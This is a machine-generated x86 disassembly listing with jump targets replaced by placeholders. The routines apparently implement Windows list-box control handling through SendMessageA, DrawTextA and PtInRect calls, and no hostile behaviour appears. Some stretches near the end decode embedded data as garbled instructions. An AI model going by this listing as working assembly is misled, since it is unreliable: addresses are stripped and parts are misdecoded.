mov esi edx
mov ebx eax
push 0x0
push esi
push 0x187
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
cmp eax 0xffffffff
jne r-xdata
cmp eax 0x1
sbb eax eax
inc eax
pop ecx
pop edx
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
sub_43b690
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x208 ] 0x0
je r-xdata
test bl bl
je r-xdata
push esi
xor eax eax
mov al bl
push eax
push 0x185
mov eax edi
call sub_4493d8
push eax
call SendMessageA
inc eax
jne r-xdata
push 0x0
push 0xffffffff
push 0x186
mov eax edi
call sub_4493d8
push eax
call SendMessageA
push 0x0
push esi
push 0x186
mov eax edi
call sub_4493d8
push eax
call SendMessageA
inc eax
jne r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bac0
call sub_4039c0
jmp r-xdata
sub_43b764
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x238 ]
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
add al 0xfd
sub al 0x2
jae r-xdata
mov [ esi + 0x238 ] bl
mov eax esi
call sub_446940
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax esi
call sub_43b740
sub_43b7bc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43b864
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b86b
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404008
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_4044c8
mov edx eax
mov eax [ esi + 0x8 ]
call sub_4089d0
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov [ esi + 0xc ] eax
jmp r-xdata
sub_43b870
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43b906
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ ebx + 0x262 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0xffffffff
jmp r-xdata
cmp [ esi + 0x4 ] 0xffffffff
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43b90d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp eax [ esi + 0x4 ]
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404008
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x264 ]
call [ ebx + 0x260 ]
mov eax [ ebp - 0x4 ]
call sub_4042c8
mov [ esi + 0xc ] eax
jmp r-xdata
sub_43b928
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b7a0
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x197
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
sub_43b954
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
pop ebx
retn
sub al 0x3
je r-xdata
xor edx edx
mov eax ebx
call sub_43b764
jmp r-xdata
dec al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_43b764
jmp r-xdata
sub_43b998
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi eax
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea edx [ esp + 0x20 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x20 ]
push eax
call PtInRect
test eax eax
je r-xdata
or ebp 0xffffffff
mov eax esi
call sub_43b7a0
mov ebp eax
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
cmp edi ebp
jle r-xdata
test bl bl
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx ebp
mov edx 0x198
mov eax esi
call sub_443d6c
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax ebp
add esp 0x28
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
cmp edi ebp
jg r-xdata
sub_43ba24
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_44622c
mov ecx r-xdata
mov edx edi
mov eax ebx
call sub_446158
mov esi rw-data
cmp [ ebx + 0x23b ] 0x0
je r-xdata
mov al [ ebx + 0x238 ]
mov edx eax
add dl 0xfd
sub dl 0x2
setb dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
or edx 0x300000
or edx 0x1
or edx [ edi + 0x4 ]
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x23a ]
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x208 ]
or edx [ esi + eax * 4 ]
xor eax eax
mov al [ ebx + 0x239 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x22c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
xor eax eax
mov al [ ebx + 0x224 ]
or edx [ eax * 4 + rw-data ]
cmp [ ebx + 0x23c ] 0x0
setne al
and eax 0x7f
or edx [ eax * 4 + rw-data ]
mov [ edi + 0x4 ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov esi rw-data
mov eax ebx
mov si 0xffc8
call sub_403430
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
or eax 0x1
not eax
and [ edi + 0x24 ] eax
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
and [ edi + 0x4 ] 0xff7fffff
or [ edi + 0x8 ] 0x200
sub_43bb3c
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x48 ]
mov edi [ ebx + 0x4c ]
mov eax ebx
call sub_446358
push 0x14
push edi
push esi
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push 0x0
mov eax ebx
call sub_4493d8
push eax
call SetWindowPos
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax ebx
call sub_43b418
mov eax [ ebx + 0x234 ]
cmp eax 0xffffffff
jne r-xdata
lea eax [ ebx + 0x23c ]
push eax
push 0x1
push 0x192
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
mov dl [ ebx + 0x238 ]
add dl 0xfd
sub dl 0x2
jae r-xdata
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov esi [ ebx + 0x240 ]
test esi esi
je r-xdata
mov edx eax
mov eax ebx
call sub_43c504
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x244 ]
mov eax ebx
call sub_43b928
mov edx [ ebx + 0x248 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov [ ebx + 0x234 ] 0xffffffff
mov edx esi
mov eax [ ebx + 0x218 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebx + 0x240 ]
call sub_40d524
sub_43bc0c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_44673c
pop esi
pop ebx
retn
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ ebx + 0x240 ] esi
mov edx [ ebx + 0x218 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x234 ] eax
jmp r-xdata
mov eax ebx
call sub_43b7a0
mov [ ebx + 0x244 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x248 ] eax
sub_43bc88
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax ebx
call sub_446db4
mov edi [ esi ]
cmp edi 0x201
je r-xdata
mov eax ebx
call sub_443328
test al al
jne r-xdata
cmp edi 0x203
jne r-xdata
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_446d20
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
sub_43bcee
add [ eax ] al
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi edx
mov esi eax
mov ax [ edi + 0x4 ]
call sub_4598a0
mov ebx eax
cmp [ esi + 0x5d ] 0x1
jne r-xdata
mov edx edi
mov eax esi
call sub_44423c
cmp [ esi + 0x5d ] 0x1
jne r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x208 ] 0x0
je r-xdata
test bl 0x1
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_443260
test bl 0x4
jne r-xdata
mov edx esp
mov eax [ edi + 0x8 ]
call sub_406dd8
mov edx esp
mov cl 0x1
mov eax esi
call sub_43b998
mov ebp eax
test ebp ebp
jl r-xdata
test bl 0x4
je r-xdata
test bl 0x1
jne r-xdata
mov edx ebp
mov eax esi
call sub_43b640
test al al
je r-xdata
or ecx 0xffffffff
xor edx edx
mov eax esi
call sub_443260
jmp r-xdata
sub_43bd8c
push esi
mov esi eax
mov ax [ edx + 0x6 ]
dec ax
je r-xdata
mov eax esi
call sub_4427c4
mov eax esi
mov si 0xffeb
call sub_403430
pop esi
retn
dec ax
je r-xdata
mov eax esi
mov si 0xffe9
call sub_403430
jmp r-xdata
pop esi
retn
sub_43bdc0
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov [ ebp - 0x18 ] 0xbc2b
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x10 ] eax
mov eax [ edi ]
call sub_4493d8
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x58 ] 0x2
mov [ ebp - 0x4c ] 0x1
xor eax eax
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x40 ] eax
mov eax [ edi ]
call sub_4493d8
mov [ ebp - 0x54 ] eax
mov eax [ edi ]
call sub_4493d8
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x28 ] 0xbc2c
mov eax [ edi ]
call sub_4493d8
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x70 ] 0x2
mov eax [ edi ]
call sub_4493d8
mov [ ebp - 0x6c ] eax
xor esi esi
mov eax [ edi ]
call sub_43b7a0
mov ebx eax
lea eax [ ebp - 0x80 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call GetClipBox
mov eax [ edi ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x8 ] eax
cmp esi [ ebp - 0x4 ]
jge r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x68 ] ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x64 ] eax
mov eax [ edi ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0x5c ]
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x50 ] ebx
lea edx [ ebp - 0x28 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
mov eax [ ebp - 0x60 ]
add eax esi
push eax
lea eax [ ebp - 0x90 ]
push eax
mov ecx [ ebp - 0x64 ]
mov edx esi
xor eax eax
call sub_419034
push esi
push edi
lea esi [ ebp - 0x90 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
lea edx [ ebp - 0x18 ]
mov eax [ edi ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
add esi [ ebp - 0x60 ]
inc ebx
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp ebx eax
jge r-xdata
mov eax [ edi ]
mov eax [ eax + 0x218 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x5c ] eax
cmp esi [ ebp - 0x4 ]
jl r-xdata
sub_43bf20
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_447530
push ebp
call sub_43bdc0
pop ecx
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_43bf64
push ebx
add esp 0xffffffe0
mov ebx eax
mov [ esp + 0x8 ] 0x201
push esp
call GetCursorPos
lea ecx [ esp + 0x18 ]
mov edx esp
mov eax ebx
call sub_4426fc
lea eax [ esp + 0x18 ]
call sub_406dec
mov [ esp + 0x10 ] eax
xor eax eax
mov [ esp + 0xc ] eax
xor eax eax
mov [ esp + 0x14 ] eax
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov [ esp + 0x8 ] 0x202
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
add esp 0x20
pop ebx
retn
sub_43bfc4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov esi ecx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c0d0
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x252 ] 0x0
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebx + 0x228 ]
call sub_424614
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
cmp edi eax
jge r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov ax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx ebx
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c0d7
lea eax [ ebp - 0x8 ]
call sub_404008
retn
mov edx 0x824
mov eax ebx
call sub_444e98
mov [ ebp - 0x4 ] eax
mov eax ebx
mov si 0xffc8
call sub_403430
test al al
jne r-xdata
sub [ ebp - 0x10 ] 0x2
add [ ebp - 0x18 ] 0x2
jmp r-xdata
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ ebx + 0x218 ]
mov esi [ eax ]
call [ esi + 0xc ]
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_43c5e8
jmp r-xdata
lea eax [ ebp - 0x8 ]
call sub_404008
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_4042c8
push eax
mov eax [ ebp - 0x8 ]
call sub_4044c8
push eax
mov eax [ ebx + 0x228 ]
call sub_4249b8
push eax
call DrawTextA
sub_43c100
push ebx
push esi
push edi
push ebp
mov esi eax
mov edi [ edx + 0x8 ]
mov bp [ edi + 0x10 ]
mov edx [ edi + 0x18 ]
mov eax [ esi + 0x228 ]
call sub_424a38
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x228 ]
call sub_4248d8
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x228 ]
call sub_4248f4
cmp [ edi + 0x8 ] 0x0
jl r-xdata
cmp [ edi + 0x8 ] 0x0
jl r-xdata
test bp 0x1
je r-xdata
lea edx [ edi + 0x1c ]
mov eax [ esi + 0x228 ]
call sub_424614
push ebp
lea ecx [ edi + 0x1c ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf8 ]
jmp r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424270
mov eax [ esi + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_423aa4
xor edx edx
mov eax [ esi + 0x228 ]
call sub_424a38
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ edi + 0x1c ]
push eax
mov eax [ edi + 0x18 ]
push eax
call DrawFocusRect
test bp 0x10
je r-xdata
sub_43c1bc
push ebx
push esi
push edi
mov esi eax
mov edi [ edx + 0x8 ]
mov eax [ esi + 0x230 ]
mov [ edi + 0x10 ] eax
cmp [ esi + 0x238 ] 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
lea ecx [ edi + 0x10 ]
mov edx [ edi + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xfc ]
sub_43c1ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4489b8
pop esi
pop ebx
retn
cmp [ ebx + 0x224 ] 0x1
jne r-xdata
mov eax ebx
call sub_446940
sub_43c218
push ebx
push esi
push edi
mov esi eax
cmp [ esi + 0x208 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
mov cl 0x1
mov edx edi
mov eax esi
call sub_43b690
inc edi
dec ebx
jne r-xdata
sub_43c250
push ebp
mov ebp esp
push ebx
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_4044c8
push eax
push 0xffffffff
push 0x18f
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4493d8
push eax
call SendMessageA
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x21c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43c630
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov al [ eax ]
sub al 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x208 ] 0x0
je r-xdata
cmp ebx 0xffffffff
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub al 0x5
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffeb
call sub_403430
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax ]
call [ edx + 0xdc ]
mov esi ebx
mov edx esi
mov eax esi
call sub_406e0c
push eax
push 0x1
push 0x19b
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4493d8
push eax
call SendMessageA
sub al 0xe
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov [ eax ] 0x0
sub_43c334
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_43c4f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_448384
mov eax [ ebx ]
cmp [ eax + 0x210 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c4fb
lea eax [ ebp - 0x30 ]
mov edx 0x3
call sub_40402c
retn
call GetTickCount
mov edx [ ebx ]
sub eax [ edx + 0x220 ]
cmp eax 0x1f4
jb r-xdata
call GetTickCount
mov edx [ ebx ]
mov [ edx + 0x220 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax ]
cmp al 0x8
je r-xdata
mov eax [ ebx ]
add eax 0x21c
call sub_404008
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4042c8
mov edx eax
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_40c3c4
cmp al 0x2
je r-xdata
mov eax [ ebp - 0x8 ]
mov al [ eax ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4042c8
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_404568
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4042c8
mov edx eax
mov eax [ ebx ]
add eax 0x21c
mov ecx 0x1
call sub_404568
lea eax [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_4041f0
mov edx [ ebp - 0x30 ]
mov eax [ ebx ]
add eax 0x21c
call sub_4042d0
jmp r-xdata
push 0x1
push 0x102
push 0x102
mov eax [ ebx ]
call sub_4493d8
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
xor edx edx
mov eax [ ebx ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax [ ebx ]
mov si 0xffeb
call sub_403430
push ebp
call sub_43c250
pop ecx
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
call sub_4042c8
test eax eax
jle r-xdata
mov eax [ ebx ]
push [ eax + 0x21c ]
lea eax [ ebp - 0x28 ]
mov edx [ ebp - 0x8 ]
mov dl [ edx ]
call sub_4041f0
push [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov edx [ ebp - 0x1c ]
call sub_4041f0
push [ ebp - 0x2c ]
mov eax [ ebx ]
add eax 0x21c
mov edx 0x3
call sub_404388
mov eax [ ebp - 0x8 ]
mov [ eax ] 0x0
jmp r-xdata
sub_43c504
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43c5d8
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ ebx + 0x238 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
push 0x0
push esi
push 0x1a7
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405efc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_4039c0
jmp r-xdata
cmp eax 0xfffffffe
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c5df
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40402c
retn
mov [ ebx + 0x214 ] esi
jmp r-xdata
sub_43c608
push ebx
push ecx
cmp [ eax + 0x272 ] 0x0
je r-xdata
mov eax [ esp ]
pop edx
pop ebx
retn
push esp
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x274 ]
call [ ebx + 0x270 ]
sub_43c630
push ebx
cmp [ eax + 0x26a ] 0x0
je r-xdata
or eax 0xffffffff
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x26c ]
call [ ebx + 0x268 ]
pop ebx
retn
sub_43c670
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43c654
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push esi
push 0x194
mov eax ebx
call sub_4493d8
push eax
call SendMessageA
sub_43c69c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43c6c1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c6c8
retn
sub_43c737
add ah dh
test [ eax + eax - 0x50 ] 0x8400420e
or eax [ edx ]
jl r-xdata
adc [ edx ] eax
cmp [ ecx ] dl
inc edx
add ah cl
adc [ edx ] al
cld
adc [ edx ] al
rcl [ eax ] 0x1
inc edx
add [ ebp + ebp * 8 + 0x44 ] cl
add [ esi + esi * 8 ] bl
inc esp
add [ ebp + esi * 8 - 0x70fffbc ] dh
inc esp
add [ ebx ] cl
push esp
dec eax
imul ebp [ esi + 0x74 ] 0x69746341
outsd
outsb
test bh al
inc ebx
add [ edi ] al
or edx [ eax + ecx * 2 + 0x69 ]
outsb
je r-xdata
inc edx
add [ eax - 0x37ffbdf2 ] bh
mov [ ebx ] sub_421194
or [ ebx - 0x7d170f3c ] al
insd
cld
dec [ ebx + 0x33f08bda ]
ror [ ebx + 0x2aa1e8c6 ] cl
add [ eax ] eax
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
and bh al
inc ebx
add [ eax + 0x40044ea ] dl
add [ eax ] cl
push ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_43c829
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c830
retn
inc ecx
arpl [ esi + ebp * 2 + 0x73 ] si
add [ eax ] eax
int3
sub_43c7c8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44f284
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_43c83c
push 0xfb004806
inc [ eax ]
add ah cl
add eax 0xffffffe0
jmp r-xdata
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov edi [ ebp + 0xc ]
xor eax eax
push ebp
push sub_43d19f
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
mov eax esi
call sub_43d32c
test al al
je r-xdata
xor eax eax
pop edx
